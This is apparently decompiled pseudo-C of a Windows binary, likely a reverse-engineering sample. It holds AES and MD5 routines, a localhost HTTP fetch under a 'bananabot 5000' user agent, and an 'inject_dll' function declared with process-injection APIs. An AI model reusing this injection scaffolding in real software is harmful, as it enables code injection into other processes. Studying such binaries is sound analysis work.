#include <windows.h>
#include <defs.h>

#include <stdarg.h>


//-------------------------------------------------------------------------
// Function declarations

void sub_13F921010();
void sub_13F921130();
// __int64 sub_13F921180(void); weak
__int64 __fastcall sub_13F9214E0(); // weak
__int64 __fastcall sub_13F921510(int (__cdecl *a1)());
__int64 sub_13F921530();
__int64 __fastcall nullsub_2(); // weak
char __fastcall sub_13F921550(_BYTE *a1, char *a2);
unsigned __int8 *__fastcall sub_13F921610(_BYTE *a1, __int64 a2);
unsigned __int8 *__fastcall sub_13F921850(unsigned __int8 *, __int64);
__int64 __fastcall sub_13F921BA0(__int64, __int64);
char __fastcall sub_13F921BB0(__m128i *a1, char *a2, const __m128i *a3);
void __fastcall sub_13F921BE0(__m128i *a1, const __m128i *a2);
unsigned __int8 *__fastcall sub_13F921BF0(__int64 a1, _BYTE *a2);
__int64 __fastcall sub_13F921C00(__int64, __int64);
void __fastcall sub_13F921C10(__m128i *a1, __int64 a2, unsigned __int64 a3);
void __fastcall sub_13F921C90(__int64 a1, __m128i *a2, unsigned __int64 a3);
void __fastcall sub_13F921D00(const __m128i *a1, _BYTE *a2, __int64 a3);
_BOOL8 __fastcall inject_dll(HANDLE hProcess, char *Str);
char *__fastcall sub_13F921F50(void *Src, size_t Size);
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd);
void sub_13F922150();
LRESULT __fastcall sub_13F922AF0(HWND hWndParent, UINT, WPARAM, HGDIOBJ);
__int64 __fastcall sub_13F922C90(_DWORD *, __int64);
__int64 __fastcall sub_13F922DB0(__int64 *, __int64, unsigned __int64);
__int64 __fastcall sub_13F922E90(__int64 *);
__int64 __fastcall sub_13F922F70(const char *a1, __m128i *a2);
void __fastcall sub_13F922FE0(FILE *Stream, __m128i *a2);
void (*sub_13F9231D0())(void);
__int64 sub_13F923210(void); // weak
__int64 __fastcall sub_13F923280(); // weak
__int64 __fastcall sub_13F9232B0(); // weak
LONGLONG sub_13F9232C0();
void __fastcall __noreturn sub_13F9233A0(DWORD64 a1);
__int64 __fastcall TlsCallback_1(__int64, int);
__int64 __fastcall TlsCallback_0(__int64 a1, int a2);
__int64 __fastcall sub_13F923550(); // weak
__int64 (__fastcall *__fastcall sub_13F923560(int a1, __int64 a2, double a3, double a4, __int64 a5))(_QWORD);
void __fastcall sub_13F9235B0(_UserMathErrorFunctionPointer UserMathErrorFunction);
__int64 __fastcall sub_13F9235C0(__int64 a1);
void sub_13F9236C0();
__int64 __fastcall sub_13F9236D0(__int64 a1);
__int64 __fastcall sub_13F9236E0(__int64 a1);
int __fastcall sub_13F9236F0(_DWORD *a1, _DWORD *a2, unsigned int a3);
void sub_13F9238C0();
__int64 __fastcall sub_13F923B80(unsigned int *a1);
__int64 __fastcall sub_13F923D20(); // weak
void sub_13F924000();
__int64 __fastcall sub_13F924070(int a1, __int64 a2);
__int64 __fastcall sub_13F9240F0(int);
__int64 __fastcall sub_13F924190(__int64, int);
_BOOL8 __fastcall sub_13F924270(__int64 a1);
_BOOL8 __fastcall sub_13F924290(__int64 a1);
__int64 __fastcall sub_13F9242B0(__int64, unsigned __int64);
const char *__fastcall sub_13F924300(char *Str2);
__int64 __fastcall sub_13F924390();
__int64 __fastcall sub_13F924410();
__int64 __fastcall sub_13F924450();
__int64 sub_13F9244C0(void); // weak
_BOOL8 __fastcall sub_13F924500();
__int64 __fastcall sub_13F9245A0();
unsigned __int64 __fastcall sub_13F924650();
// int __cdecl vfprintf(FILE *const Stream, const char *const Format, va_list ArgList);
// int __cdecl strncmp(const char *Str1, const char *Str2, size_t MaxCount);
// size_t __cdecl strlen(const char *Str);
// _crt_signal_t __cdecl signal(int Signal, _crt_signal_t Function);
// void *__cdecl memcpy(void *, const void *Src, size_t Size);
// void *__cdecl malloc(size_t Size);
// size_t __cdecl fwrite(const void *Buffer, size_t ElementSize, size_t ElementCount, FILE *Stream);
// void __cdecl free(void *Block);
// size_t __cdecl fread(void *Buffer, size_t ElementSize, size_t ElementCount, FILE *Stream);
// int fprintf(FILE *const Stream, const char *const Format, ...);
// void *__cdecl calloc(size_t Count, size_t Size);
// void __cdecl __noreturn abort();
// _onexit_t __cdecl onexit(_onexit_t Func);
// void __cdecl _setusermatherr(_UserMathErrorFunctionPointer UserMathErrorFunction);
FILE *__fastcall sub_13F924750(int a1);
__int64 __fastcall sub_13F924770(); // weak
__int64 __fastcall sub_13F924780(__int64 a1);
__int64 __fastcall sub_13F924790(); // weak
__int64 __fastcall sub_13F9247A0(); // weak
// FILE *__cdecl _iob_func();
void __noreturn sub_13F9248B0(char *Format, ...);

//-------------------------------------------------------------------------
// Data declarations

CHAR ClassName[] = "Window Class"; // idb
_UNKNOWN unk_13F925020; // weak
void *off_13F925060 = (void *)0x404950i64; // weak
__int64 qword_13F925100 = 47936899621426i64; // weak
__int64 qword_13F925110 = -47936899621427i64; // weak
_BYTE byte_13F926000[32] =
{
  -115,
  1,
  2,
  4,
  8,
  16,
  32,
  64,
  128,
  27,
  54,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0
}; // weak
_BYTE byte_13F926120[256] =
{
  99,
  124,
  119,
  123,
  -14,
  107,
  111,
  -59,
  48,
  1,
  103,
  43,
  -2,
  -41,
  -85,
  118,
  -54,
  -126,
  -55,
  125,
  -6,
  89,
  71,
  -16,
  -83,
  -44,
  -94,
  -81,
  -100,
  -92,
  114,
  -64,
  -73,
  -3,
  -109,
  38,
  54,
  63,
  -9,
  -52,
  52,
  -91,
  -27,
  -15,
  113,
  -40,
  49,
  21,
  4,
  -57,
  35,
  -61,
  24,
  -106,
  5,
  -102,
  7,
  18,
  128,
  -30,
  -21,
  39,
  -78,
  117,
  9,
  -125,
  44,
  26,
  27,
  110,
  90,
  -96,
  82,
  59,
  -42,
  -77,
  41,
  -29,
  47,
  -124,
  83,
  -47,
  0,
  -19,
  32,
  -4,
  -79,
  91,
  106,
  -53,
  -66,
  57,
  74,
  76,
  88,
  -49,
  -48,
  -17,
  -86,
  -5,
  67,
  77,
  51,
  -123,
  69,
  -7,
  2,
  127,
  80,
  60,
  -97,
  -88,
  81,
  -93,
  64,
  -113,
  -110,
  -99,
  56,
  -11,
  -68,
  -74,
  -38,
  33,
  16,
  -1,
  -13,
  -46,
  -51,
  12,
  19,
  -20,
  95,
  -105,
  68,
  23,
  -60,
  -89,
  126,
  61,
  100,
  93,
  25,
  115,
  96,
  -127,
  79,
  -36,
  34,
  42,
  -112,
  -120,
  70,
  -18,
  -72,
  20,
  -34,
  94,
  11,
  -37,
  -32,
  50,
  58,
  10,
  73,
  6,
  36,
  92,
  -62,
  -45,
  -84,
  98,
  -111,
  -107,
  -28,
  121,
  -25,
  -56,
  55,
  109,
  -115,
  -43,
  78,
  -87,
  108,
  86,
  -12,
  -22,
  101,
  122,
  -82,
  8,
  -70,
  120,
  37,
  46,
  28,
  -90,
  -76,
  -58,
  -24,
  -35,
  116,
  31,
  75,
  -67,
  -117,
  -118,
  112,
  62,
  -75,
  102,
  72,
  3,
  -10,
  14,
  97,
  53,
  87,
  -71,
  -122,
  -63,
  29,
  -98,
  -31,
  -8,
  -104,
  17,
  105,
  -39,
  -114,
  -108,
  -101,
  30,
  -121,
  -23,
  -50,
  85,
  40,
  -33,
  -116,
  -95,
  -119,
  13,
  -65,
  -26,
  66,
  104,
  65,
  -103,
  45,
  15,
  -80,
  84,
  -69,
  22
}; // weak
_DWORD md5_consts[64] =
{
  -680876936,
  -389564586,
  606105819,
  -1044525330,
  -176418897,
  1200080426,
  -1473231341,
  -45705983,
  1770035416,
  -1958414417,
  -42063,
  -1990404162,
  1804603682,
  -40341101,
  -1502002290,
  1236535329,
  -165796510,
  -1069501632,
  643717713,
  -373897302,
  -701558691,
  38016083,
  -660478335,
  -405537848,
  568446438,
  -1019803690,
  -187363961,
  1163531501,
  -1444681467,
  -51403784,
  1735328473,
  -1926607734,
  -378558,
  -2022574463,
  1839030562,
  -35309556,
  -1530992060,
  1272893353,
  -155497632,
  -1094730640,
  681279174,
  -358537222,
  -722521979,
  76029189,
  -640364487,
  -421815835,
  530742520,
  -995338651,
  -198630844,
  1126891415,
  -1416354905,
  -57434055,
  1700485571,
  -1894986606,
  -1051523,
  -2054922799,
  1873313359,
  -30611744,
  -1560198380,
  1309151649,
  -145523070,
  -1120210379,
  718787259,
  -343485551
}; // weak
_DWORD dword_13F926520[64] =
{
  7,
  12,
  17,
  22,
  7,
  12,
  17,
  22,
  7,
  12,
  17,
  22,
  7,
  12,
  17,
  22,
  5,
  9,
  14,
  20,
  5,
  9,
  14,
  20,
  5,
  9,
  14,
  20,
  5,
  9,
  14,
  20,
  4,
  11,
  16,
  23,
  4,
  11,
  16,
  23,
  4,
  11,
  16,
  23,
  4,
  11,
  16,
  23,
  6,
  10,
  15,
  21,
  6,
  10,
  15,
  21,
  6,
  10,
  15,
  21,
  6,
  10,
  15,
  21
}; // weak
const struct _EXCEPTION_POINTERS ExceptionInfo = { (PEXCEPTION_RECORD)0x409540i64, (PCONTEXT)0x409060i64 }; // idb
void *off_13F926900 = (void *)0x4050A0i64; // weak
void *off_13F926920 = (void *)0x404930i64; // weak
void *off_13F926930 = (void *)0x406C20i64; // weak
void *off_13F926940 = (void *)0x406C20i64; // weak
void *off_13F926980 = (void *)0x40A51Ci64; // weak
void *off_13F926990 = (void *)0x40A534i64; // weak
void *off_13F926A90 = (void *)0x409610i64; // weak
__int64 window; // weak
HGDIOBJ ho; // idb
int dword_13F929040; // weak
struct _CONTEXT ContextRecord; // idb
__int64 qword_13F929540; // weak
__int64 qword_13F929550; // weak
__int64 (__fastcall *qword_13F929600)(_QWORD); // weak
int dword_13F929620; // weak
int dword_13F929624; // weak
__int64 qword_13F929628; // weak
int dword_13F929648; // weak
_UNKNOWN unk_13F929660; // weak
struct _IMAGE_RUNTIME_FUNCTION_ENTRY FunctionTable; // idb
void *Block; // idb
int dword_13F9298E8; // weak
struct _RTL_CRITICAL_SECTION CriticalSection; // idb
__int64 qword_13F929950; // weak
// extern BOOL (__stdcall *DeleteObject)(HGDIOBJ ho);
// extern HANDLE (__stdcall *CreateRemoteThread)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// extern void (__stdcall *DeleteCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern void (__stdcall *EnterCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern HANDLE (__stdcall *GetCurrentProcess)();
// extern DWORD (__stdcall *GetCurrentProcessId)();
// extern DWORD (__stdcall *GetCurrentThreadId)();
// extern DWORD (__stdcall *GetLastError)();
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern void (__stdcall *GetSystemTimeAsFileTime)(LPFILETIME lpSystemTimeAsFileTime);
// extern DWORD (__stdcall *GetTickCount)();
// extern void (__stdcall *InitializeCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern void (__stdcall *LeaveCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern BOOL (__stdcall *QueryPerformanceCounter)(LARGE_INTEGER *lpPerformanceCount);
// extern BOOLEAN (__cdecl *RtlAddFunctionTable)(PRUNTIME_FUNCTION FunctionTable, ULONG EntryCount, ULONG64 BaseAddress);
// extern void (__stdcall *RtlCaptureContext)(PCONTEXT ContextRecord);
// extern PRUNTIME_FUNCTION (__stdcall *RtlLookupFunctionEntry)(ULONG64 ControlPc, PULONG64 ImageBase, PUNWIND_HISTORY_TABLE HistoryTable);
// extern PEXCEPTION_ROUTINE (__stdcall *RtlVirtualUnwind)(ULONG HandlerType, ULONG64 ImageBase, ULONG64 ControlPc, PRUNTIME_FUNCTION FunctionEntry, PCONTEXT ContextRecord, PVOID *HandlerData, PULONG64 EstablisherFrame, PKNONVOLATILE_CONTEXT_POINTERS ContextPointers);
// extern LPTOP_LEVEL_EXCEPTION_FILTER (__stdcall *SetUnhandledExceptionFilter)(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter);
// extern BOOL (__stdcall *TerminateProcess)(HANDLE hProcess, UINT uExitCode);
// extern LPVOID (__stdcall *TlsGetValue)(DWORD dwTlsIndex);
// extern LONG (__stdcall *UnhandledExceptionFilter)(struct _EXCEPTION_POINTERS *ExceptionInfo);
// extern LPVOID (__stdcall *VirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// extern BOOL (__stdcall *VirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// extern SIZE_T (__stdcall *VirtualQuery)(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength);
// extern BOOL (__stdcall *WriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
// extern HWND (__stdcall *CreateWindowExA)(DWORD dwExStyle, LPCSTR lpClassName, LPCSTR lpWindowName, DWORD dwStyle, int X, int Y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam);
// extern HWND (__stdcall *CreateWindowExW)(DWORD dwExStyle, LPCWSTR lpClassName, LPCWSTR lpWindowName, DWORD dwStyle, int X, int Y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam);
// extern LRESULT (__stdcall *DefWindowProcA)(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
// extern LRESULT (__stdcall *DispatchMessageA)(const MSG *lpMsg);
// extern BOOL (__stdcall *GetMessageA)(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax);
// extern LONG_PTR (__stdcall *GetWindowLongPtrA)(HWND hWnd, int nIndex);
// extern HCURSOR (__stdcall *LoadCursorA)(HINSTANCE hInstance, LPCSTR lpCursorName);
// extern HICON (__stdcall *LoadIconA)(HINSTANCE hInstance, LPCSTR lpIconName);
// extern void (__stdcall *PostQuitMessage)(int nExitCode);
// extern ATOM (__stdcall *RegisterClassExA)(const WNDCLASSEXA *);
// extern BOOL (__stdcall *ShowWindow)(HWND hWnd, int nCmdShow);
// extern BOOL (__stdcall *TranslateMessage)(const MSG *lpMsg);


//----- (000000013F921010) ----------------------------------------------------
void sub_13F921010()
{
  JUMPOUT(0x13F92101Bi64);
}
// 13F921014: control flows out of bounds to 13F92101B

//----- (000000013F921130) ----------------------------------------------------
void sub_13F921130()
{
  JUMPOUT(0x13F921134i64);
}
// 13F921130: control flows out of bounds to 13F921134

//----- (000000013F9214E0) ----------------------------------------------------
__int64 sub_13F9214E0()
{
  *(_DWORD *)off_13F926A90 = 0;
  sub_13F9232C0();
  return sub_13F921180();
}
// 13F921180: using guessed type __int64 sub_13F921180(void);
// 13F9214E0: using guessed type __int64 __fastcall sub_13F9214E0();
// 13F926A90: using guessed type void *off_13F926A90;

//----- (000000013F921510) ----------------------------------------------------
__int64 __fastcall sub_13F921510(int (__cdecl *a1)())
{
  return (unsigned int)-(onexit(a1) == 0i64);
}

//----- (000000013F921530) ----------------------------------------------------
__int64 sub_13F921530()
{
  return sub_13F921510((int (__cdecl *)())nullsub_2);
}
// 13F921540: using guessed type __int64 __fastcall nullsub_2();

//----- (000000013F921550) ----------------------------------------------------
char __fastcall sub_13F921550(_BYTE *a1, char *a2)
{
  char *v2; // r9
  _BYTE *v3; // rax
  char v4; // r8
  unsigned int v5; // r10d
  __int64 v6; // r9
  __int64 v7; // r8
  __int64 v8; // rdx
  __int64 v9; // rax
  char v10; // si
  char v11; // r9
  char v12; // r8
  char v13; // dl
  char result; // al

  v2 = a2 + 16;
  v3 = a1;
  do
  {
    v4 = *a2;
    a2 += 4;
    v3 += 4;
    *(v3 - 4) = v4;
    *(v3 - 3) = *(a2 - 3);
    *(v3 - 2) = *(a2 - 2);
    *(v3 - 1) = *(a2 - 1);
  }
  while ( v2 != a2 );
  v5 = 4;
  do
  {
    v6 = (unsigned __int8)a1[12];
    v7 = (unsigned __int8)a1[13];
    v8 = (unsigned __int8)a1[14];
    v9 = (unsigned __int8)a1[15];
    if ( (v5 & 3) == 0 )
    {
      v10 = byte_13F926120[v7];
      LOBYTE(v7) = byte_13F926120[v8];
      LOBYTE(v8) = byte_13F926120[v9];
      LOBYTE(v9) = byte_13F926120[v6];
      LOBYTE(v6) = byte_13F926000[v5 >> 2] ^ v10;
    }
    v11 = *a1 ^ v6;
    ++v5;
    a1 += 4;
    v12 = *(a1 - 3) ^ v7;
    v13 = *(a1 - 2) ^ v8;
    result = *(a1 - 1) ^ v9;
    a1[12] = v11;
    a1[13] = v12;
    a1[14] = v13;
    a1[15] = result;
  }
  while ( v5 != 44 );
  return result;
}
// 13F926000: using guessed type _BYTE byte_13F926000[32];
// 13F926120: using guessed type _BYTE byte_13F926120[256];

//----- (000000013F921610) ----------------------------------------------------
unsigned __int8 *__fastcall sub_13F921610(_BYTE *a1, __int64 a2)
{
  unsigned __int8 *v2; // r11
  _BYTE *v3; // r9
  unsigned __int8 *v4; // r10
  _BYTE *v5; // rax
  char *v6; // r8
  char v7; // bl
  __int64 i; // rsi
  unsigned __int8 *v9; // r8
  unsigned __int8 *v10; // rax
  __int64 v11; // rbp
  char v12; // al
  char v13; // bp
  char v14; // r12
  char v15; // r8
  char v16; // al
  char v17; // r13
  char v18; // r8
  char v19; // al
  char v20; // r8
  char v21; // al
  char v22; // r8
  char *j; // rax
  char v24; // r8
  unsigned __int8 v25; // bp
  char v26; // r12
  char v27; // r13
  unsigned __int8 v28; // r8
  unsigned __int8 v29; // r14
  unsigned __int8 v30; // r14
  char v31; // r13
  char v32; // r12
  unsigned __int8 *v33; // rbp
  unsigned __int8 *v34; // rax
  unsigned __int8 *v35; // r8
  char v36; // r12
  __int64 v37; // r8
  unsigned __int8 *result; // rax
  unsigned __int8 *v39; // rdx
  char v40; // cl

  v2 = a1 + 4;
  v3 = a1 + 4;
  v4 = a1 + 20;
  do
  {
    v5 = v3 - 4;
    v6 = &v3[a2 - 4 - (_QWORD)a1];
    do
    {
      v7 = *v6++;
      *v5++ ^= v7;
    }
    while ( v5 != v3 );
    v3 = v5 + 4;
  }
  while ( v5 + 4 != v4 );
  for ( i = a2 + 16 - (_QWORD)a1; ; i += 16i64 )
  {
    v9 = a1 + 16;
    do
    {
      v10 = v9 - 16;
      do
      {
        v11 = *v10;
        v10 += 4;
        *(v10 - 4) = byte_13F926120[v11];
      }
      while ( v9 != v10 );
      ++v9;
    }
    while ( v9 != v4 );
    v12 = a1[1];
    v13 = a1[5];
    v14 = a1[10];
    a1[5] = a1[9];
    v15 = a1[13];
    a1[13] = v12;
    v16 = a1[2];
    v17 = a1[15];
    a1[1] = v13;
    a1[2] = v14;
    a1[9] = v15;
    v18 = a1[14];
    a1[10] = v16;
    v19 = a1[6];
    a1[6] = v18;
    v20 = a1[11];
    a1[14] = v19;
    v21 = a1[3];
    a1[3] = v17;
    a1[15] = v20;
    v22 = a1[7];
    a1[7] = v21;
    a1[11] = v22;
    if ( a2 + 160 - (_QWORD)a1 == i )
      break;
    for ( j = a1; ; v17 = j[3] )
    {
      v24 = *j;
      j += 4;
      v25 = v24 ^ v13;
      v26 = v25 ^ v17 ^ v14;
      v27 = v24;
      v28 = *(j - 1) ^ v24;
      *(j - 4) = v26 ^ v27 ^ (27 * (v25 >> 7)) ^ (2 * v25);
      v29 = *(j - 2) ^ *(j - 3);
      *(j - 3) ^= v26 ^ (27 * (v29 >> 7)) ^ (2 * v29);
      v30 = *(j - 1) ^ *(j - 2);
      v31 = v26 ^ *(j - 2);
      v32 = *(j - 1) ^ v26;
      *(j - 2) = v31 ^ (27 * (v30 >> 7)) ^ (2 * v30);
      *(j - 1) = v32 ^ (27 * (v28 >> 7)) ^ (2 * v28);
      if ( j == a1 + 16 )
        break;
      v13 = j[1];
      v14 = j[2];
    }
    v33 = a1 + 4;
    do
    {
      v34 = v33 - 4;
      v35 = &v33[i - 4];
      do
      {
        v36 = *v35++;
        *v34++ ^= v36;
      }
      while ( v33 != v34 );
      v33 += 4;
    }
    while ( v33 != v4 );
  }
  v37 = a2 + 156 - (_QWORD)a1;
  do
  {
    result = v2 - 4;
    v39 = &v2[v37];
    do
    {
      v40 = *v39++;
      *result++ ^= v40;
    }
    while ( v2 != result );
    v2 += 4;
  }
  while ( v2 != v4 );
  return result;
}
// 13F926120: using guessed type _BYTE byte_13F926120[256];

//----- (000000013F921850) ----------------------------------------------------
unsigned __int8 *__fastcall sub_401850(unsigned __int8 *a1, __int64 a2)
{
  _BYTE *v2; // r8
  unsigned __int8 *v3; // r15
  _BYTE *v4; // r11
  __int64 v5; // r10
  _BYTE *v6; // rax
  char *v7; // rcx
  char v8; // r9
  unsigned __int8 v9; // al
  unsigned __int8 v10; // dl
  unsigned __int8 v11; // al
  unsigned __int8 v12; // dl
  unsigned __int8 v13; // al
  unsigned __int8 v14; // dl
  unsigned __int8 v15; // al
  unsigned __int8 v16; // dl
  unsigned __int8 *v17; // rdx
  unsigned __int8 *v18; // rax
  __int64 v19; // rcx
  unsigned __int8 *v20; // rcx
  unsigned __int8 *result; // rax
  char *v22; // rdx
  char v23; // r8
  unsigned __int8 *v24; // rax
  unsigned __int8 v25; // r15
  unsigned __int8 v26; // r8
  unsigned __int8 v27; // dl
  unsigned __int8 v28; // r12
  unsigned __int8 v29; // r14
  unsigned __int8 v30; // si
  char v31; // r11
  unsigned __int8 v32; // r13
  unsigned __int8 v33; // bp
  char v34; // r10
  unsigned __int8 v35; // di
  unsigned __int8 v36; // bl
  char v37; // r9
  char v38; // r8
  char v39; // r13
  unsigned __int8 v40; // [rsp+6h] [rbp-72h]
  char v41; // [rsp+7h] [rbp-71h]
  unsigned __int8 *v42; // [rsp+8h] [rbp-70h]
  __int64 v43; // [rsp+10h] [rbp-68h]
  unsigned __int8 *v44; // [rsp+18h] [rbp-60h]
  unsigned __int8 *v45; // [rsp+20h] [rbp-58h]
  __int64 v46; // [rsp+28h] [rbp-50h]
  unsigned __int8 *v47; // [rsp+80h] [rbp+8h]

  v2 = a1 + 4;
  v3 = a1;
  v4 = a1 + 20;
  v45 = a1 + 4;
  v44 = a1 + 20;
  v5 = a2 + 156 - (_QWORD)a1;
  do
  {
    v6 = v2 - 4;
    v7 = &v2[v5];
    do
    {
      v8 = *v7++;
      *v6++ ^= v8;
    }
    while ( v2 != v6 );
    v2 += 4;
  }
  while ( v4 != v2 );
  v46 = a2 - (_QWORD)v3;
  v43 = a2 + 144 - (_QWORD)v3;
  v42 = v3 + 16;
  while ( 1 )
  {
    v9 = v3[13];
    v3[13] = v3[9];
    v3[9] = v3[5];
    v10 = v3[1];
    v3[1] = v9;
    v11 = v3[2];
    v3[5] = v10;
    v12 = v3[10];
    v3[10] = v11;
    v13 = v3[6];
    v3[2] = v12;
    v14 = v3[14];
    v3[14] = v13;
    v15 = v3[3];
    v3[6] = v14;
    v3[3] = v3[7];
    v3[7] = v3[11];
    v16 = v3[15];
    v3[15] = v15;
    v3[11] = v16;
    v17 = v42;
    do
    {
      v18 = v17 - 16;
      do
      {
        v19 = *v18;
        v18 += 4;
        *(v18 - 4) = byte_13F926020[v19];
      }
      while ( v17 != v18 );
      ++v17;
    }
    while ( v44 != v17 );
    v20 = v45;
    do
    {
      result = v20 - 4;
      v22 = (char *)&v20[v43 - 4];
      do
      {
        v23 = *v22++;
        *result++ ^= v23;
      }
      while ( v20 != result );
      v20 += 4;
    }
    while ( v44 != v20 );
    if ( v46 == v43 )
      break;
    v24 = v3;
    v47 = v3;
    do
    {
      v25 = *v24;
      v26 = v24[1];
      v27 = v24[2];
      v40 = (27 * (*v24 >> 7)) ^ (2 * *v24);
      v28 = (2 * v40) ^ (27 * (v40 >> 7));
      v41 = (27 * (v28 >> 7)) ^ (2 * v28);
      v29 = (2 * v26) ^ (27 * (v26 >> 7));
      v30 = (2 * v29) ^ (27 * (v29 >> 7));
      v31 = (2 * v30) ^ (27 * (v30 >> 7));
      v32 = (2 * v27) ^ (27 * (v27 >> 7));
      v33 = (27 * (v32 >> 7)) ^ (2 * v32);
      v34 = (27 * (v33 >> 7)) ^ (2 * v33);
      v35 = (27 * (v24[3] >> 7)) ^ (2 * v24[3]);
      v36 = (27 * (v35 >> 7)) ^ (2 * v35);
      v37 = (27 * (v36 >> 7)) ^ (2 * v36);
      v38 = *v24 ^ v26;
      *v24 = v37 ^ v34 ^ v31 ^ v41 ^ v33 ^ v28 ^ v29 ^ v40 ^ v24[3] ^ v27 ^ v24[1];
      v24[1] = v37 ^ v34 ^ v31 ^ v41 ^ v36 ^ v30 ^ v32 ^ v29 ^ v24[3] ^ v27 ^ v25;
      v39 = v28 ^ v35 ^ v38 ^ v24[3] ^ v32;
      v24 += 4;
      *(v24 - 2) = v37 ^ v34 ^ v31 ^ v41 ^ v39 ^ v33;
      *(v24 - 1) = v41 ^ v27 ^ v38 ^ v40 ^ v35 ^ v30 ^ v36 ^ v31 ^ v34 ^ v37;
    }
    while ( v42 != v24 );
    v3 = v47;
    v43 -= 16i64;
  }
  return result;
}
// 13F926020: using guessed type _BYTE byte_406020[256];

//----- (000000013F921BB0) ----------------------------------------------------
char __fastcall sub_13F921BB0(__m128i *a1, char *a2, const __m128i *a3)
{
  char result; // al

  result = sub_13F921550(a1, a2);
  a1[11] = _mm_loadu_si128(a3);
  return result;
}

//----- (000000013F921BE0) ----------------------------------------------------
void __fastcall sub_13F921BE0(__m128i *a1, const __m128i *a2)
{
  a1[11] = _mm_loadu_si128(a2);
}

//----- (000000013F921BF0) ----------------------------------------------------
unsigned __int8 *__fastcall sub_13F921BF0(__int64 a1, _BYTE *a2)
{
  return sub_13F921610(a2, a1);
}

//----- (000000013F921C00) ----------------------------------------------------
__int64 __fastcall sub_401C00(__int64 a1, __int64 a2)
{
  return sub_13F921850(a2, a1);
}
// 13F921850: using guessed type __int64 __fastcall sub_401850(_QWORD, _QWORD);

//----- (000000013F921C10) ----------------------------------------------------
void __fastcall sub_13F921C10(__m128i *a1, __int64 a2, unsigned __int64 a3)
{
  __m128i *v5; // rcx
  unsigned __int64 i; // rsi
  const __m128i *v8; // rbx
  __int64 j; // rax
  _BYTE *v10; // rcx

  v5 = a1 + 11;
  if ( a3 )
  {
    for ( i = 0i64; i < a3; i += 16i64 )
    {
      v8 = (const __m128i *)(a2 + i);
      for ( j = 0i64; j != 16; ++j )
        v8->m128i_i8[j] ^= v5->m128i_u8[j];
      v10 = (_BYTE *)(a2 + i);
      sub_13F921610(v10, (__int64)a1);
      v5 = (__m128i *)v8;
    }
  }
  else
  {
    v8 = v5;
  }
  a1[11] = _mm_loadu_si128(v8);
}

//----- (000000013F921C90) ----------------------------------------------------
void __fastcall sub_13F921C90(__int64 a1, __m128i *a2, unsigned __int64 a3)
{
  unsigned __int64 i; // rdi
  __m128i v7; // xmm1
  __int64 j; // rax

  for ( i = 0i64; a3 > i; *(__m128i *)(a1 + 176) = v7 )
  {
    v7 = _mm_loadu_si128(a2);
    sub_13F921850((unsigned __int8 *)a2, a1);
    for ( j = 0i64; j != 16; ++j )
      a2->m128i_i8[j] ^= *(_BYTE *)(a1 + j + 176);
    i += 16i64;
    ++a2;
  }
}

//----- (000000013F921D00) ----------------------------------------------------
void __fastcall sub_13F921D00(const __m128i *a1, _BYTE *a2, __int64 a3)
{
  _BYTE *v3; // rbx
  _BYTE *v5; // rsi
  int v6; // edx
  __int64 v7; // rax
  __int64 i; // rdx
  __int8 v9; // al
  __int64 v10; // rcx
  __m128i v11; // [rsp+20h] [rbp-38h] BYREF

  v3 = a2;
  v5 = &a2[a3];
  v6 = 16;
  if ( a3 )
  {
    do
    {
      if ( v6 == 16 )
      {
        v11 = _mm_loadu_si128(a1 + 11);
        sub_13F921610(&v11, (__int64)a1);
        for ( i = 15i64; i != -1; --i )
        {
          v9 = a1[11].m128i_i8[i];
          v10 = (int)i;
          if ( v9 != -1 )
          {
            v6 = 1;
            a1[11].m128i_i8[v10] = v9 + 1;
            v7 = 0i64;
            goto LABEL_4;
          }
          a1[11].m128i_i8[i] = 0;
        }
        v6 = 1;
        v7 = 0i64;
      }
      else
      {
        v7 = v6++;
      }
LABEL_4:
      *v3++ ^= v11.m128i_u8[v7];
    }
    while ( v3 != v5 );
  }
}
// 13F921D00: using guessed type __m128i var_38;

//----- (000000013F921DA0) ----------------------------------------------------
void *sub_401DA0()
{
  void *v0; // rsi
  void *v1; // rax
  void *v2; // r12
  void *v3; // rbx
  DWORD dwNumberOfBytesRead[11]; // [rsp+3Ch] [rbp-2Ch] BYREF

  v0 = malloc(0x4000ui64);
  v1 = InternetOpenA("bananabot 5000", 1u, 0i64, 0i64, 0);
  v2 = v1;
  if ( !v1 )
    return 0i64;
  v3 = InternetOpenUrlA(v1, "http://127.0.0.1:57328/2/summary", 0i64, 0, 0x80000000, 0i64);
  if ( v3 )
  {
    while ( InternetReadFile(v3, v0, 0x4000u, dwNumberOfBytesRead) && dwNumberOfBytesRead[0] )
      ;
    InternetCloseHandle(v3);
    InternetCloseHandle(v2);
  }
  else
  {
    v0 = 0i64;
    InternetCloseHandle(v2);
  }
  return v0;
}
// 13F921DA0: using guessed type DWORD dwNumberOfBytesRead[11];

